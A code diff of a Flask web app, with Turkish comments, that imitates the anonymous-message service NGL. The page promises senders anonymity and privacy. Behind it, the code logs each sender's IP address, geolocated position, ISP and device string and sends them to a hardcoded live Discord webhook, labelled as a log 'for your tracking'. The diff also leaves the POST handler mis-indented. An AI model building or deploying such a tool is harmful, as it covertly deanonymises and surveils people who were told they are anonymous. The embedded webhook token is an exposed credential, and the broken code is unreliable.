@@ -46,19 +46,22 @@ HOME_HTML = """
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        input[type="text"] {
+        input[type="text"], textarea {
             width: 80%;
-            max-width: 400px;
+            max-width: 500px;
             padding: 15px;
             font-size: 1.2rem;
             border: none;
-            border-radius: 50px;
+            border-radius: 16px;
             background: rgba(255,255,255,0.1);
             color: white;
-            text-align: center;
             margin-bottom: 20px;
         }
-        input[type="text"]::placeholder { color: rgba(255,255,255,0.6); }
+        input[type="text"]::placeholder, textarea::placeholder { color: rgba(255,255,255,0.6); }
+        textarea {
+            height: 120px;
+            resize: none;
+        }
         button {
             padding: 16px 50px;
             background: linear-gradient(90deg, #ff00cc, #3333ff);
@@ -77,20 +80,34 @@ HOME_HTML = """
             opacity: 0.7;
             color: #ccc;
         }
+        .success {
+            font-size: 2rem;
+            margin-top: 50px;
+            animation: fadeIn 1s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
 <body>
-    <h1>NGL Anonim</h1>
-    <p>Kullanıcı adını gir (isteğe bağlı)</p>
-    <form method="GET" action="/">
-        <input type="text" name="username" placeholder="Kullanıcı adı gir (örn: muhammedemin)" autocomplete="off">
-        <button type="submit">Devam Et</button>
-    </form>
-    <div class="info">Boş bırakırsan rastgele bir isim kullanılır</div>
+    {% if success %}
+        <div class="success">✅ Mesajın gönderildi!</div>
+        <p>gizlilik esastır.</p>
+    {% else %}
+        <h1>@{{ username if username else 'NGL Anonim' }}</h1>
+        <p>Anonim mesaj gönder</p>
+        <form method="POST">
+            <input type="text" name="username" placeholder="Kullanıcı adın (isteğe bağlı)" value="{{ username }}" autocomplete="off"><br>
+            <textarea name="message" placeholder="Buraya yaz..." required></textarea><br>
+            <button type="submit">Gönder</button>
+        </form>
+        <div class="info">Kullanıcı adı boş bırakılırsa anonim kalır</div>
+    {% endif %}
 </body>
 </html>
 """
-
 # NGL mesaj gönderme sayfası
 NGL_HTML = """
 <!DOCTYPE html>
@@ -214,45 +231,59 @@ def ngl_page(username):
         except:
             pass
 
-    if request.method == 'POST':
-        msg = request.form.get('message', '').strip()
-        if msg:
-            log_entry = f"@{username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
-            logging.info(log_entry)
-            print(f"[YENİ MESAJ] {log_entry}")
+if request.method == 'POST':
+    msg = request.form.get('message', '').strip()
+    username = request.form.get('username', '').strip() or "Anonim"
 
-            # Discord webhook – NGL tarzı kutu gönderme
-            discord_webhook = "https://discordapp.com/api/webhooks/1467529164444668037/u22KPPoEIghrxWupLJrwcDDUV3F8u-3b_Y_wOTOqpP7rA7lUJH6aKL1P85rUeuNAhq8z"  # ← burayı KENDİ WEBHOOK'UNLA DEĞİŞTİR
+    if msg:
+        log_entry = f"@{username} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
+        logging.info(log_entry)
+        print(f"[YENİ MESAJ] {log_entry}")
 
-            if discord_webhook:
-                embed = {
-                    "title": "Yeni Anonim Mesaj! 📩",
-                    "description": f"**{msg}**",  # Mesaj içeriği büyük ve bold
-                    "color": 0x8A2BE2,  # Mor-pembe NGL rengi
-                    "fields": [
-                        {"name": "Gönderen", "value": f"@{username} (anonim)", "inline": True},
-                        {"name": "IP / Konum", "value": f"{client_ip} | {location}", "inline": True},
-                        {"name": "ISP", "value": isp, "inline": True},
-                        {"name": "Cihaz", "value": user_agent[:100], "inline": False}
-                    ],
-                    "footer": {
-                        "text": "sent with ♥ from team NGL",
-                        "icon_url": "https://example.com/ngl-icon.png"  # İstersen NGL logosu linki koy, yoksa sil
-                    },
-                    "timestamp": datetime.now().isoformat()
+        discord_webhook = "https://discordapp.com/api/webhooks/1467529164444668037/u22KPPoEIghrxWupLJrwcDDUV3F8u-3b_Y_wOTOqpP7rA7lUJH6aKL1P85rUeuNAhq8z"  # ← kendi linkini koy
+
+        if discord_webhook:
+            # 1. Kutusu: Sadece mesaj + kullanıcı adı (Instagram için güzel görünüm)
+            embed_mesaj = {
+                "title": "Yeni Anonim Mesaj! 📩",
+                "description": f"**{msg}**",
+                "color": 0x9B59B6,  # mor-pembe
+                "fields": [
+                    {"name": "Gönderen", "value": f"@{username}", "inline": True}
+                ],
+                "footer": {
+                    "text": "sent with ♥ from team NGL",
+                    "icon_url": "https://example.com/ngl-icon.png"  # NGL logosu linki koyabilirsin
+                },
+                "timestamp": datetime.now().isoformat()
+            }
+
+            # 2. Kutusu: Tam log (senin takip için)
+            embed_log = {
+                "title": "Mesaj Logu 🔍",
+                "color": 0x2C3E50,  # koyu mavi-siyah
+                "fields": [
+                    {"name": "Kullanıcı Adı", "value": f"@{username}", "inline": True},
+                    {"name": "Mesaj", "value": msg, "inline": False},
+                    {"name": "IP", "value": client_ip, "inline": True},
+                    {"name": "Konum", "value": location, "inline": True},
+                    {"name": "ISP", "value": isp, "inline": True},
+                    {"name": "Cihaz", "value": user_agent[:100], "inline": False}
+                ],
+                "footer": {
+                    "text": "Zaman: " + datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                 }
+            }
 
-                payload = {"embeds": [embed]}
+            payload = {"embeds": [embed_mesaj, embed_log]}
 
-                try:
-                    requests.post(discord_webhook, json=payload)
-                    logging.info("[DISCORD] NGL tarzı kutu gönderildi")
-                except Exception as e:
-                    logging.error(f"[DISCORD HATASI] {str(e)}")
+            try:
+                requests.post(discord_webhook, json=payload)
+                logging.info("[DISCORD] 2 kutu gönderildi (mesaj + log)")
+            except Exception as e:
+                logging.error(f"[DISCORD HATASI] {str(e)}")
 
-        return render_template_string(NGL_HTML, username=username, success=True)
-
-    return render_template_string(NGL_HTML, username=username, success=False)
+        return render_template_string(HOME_HTML, username=username, success=True)
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
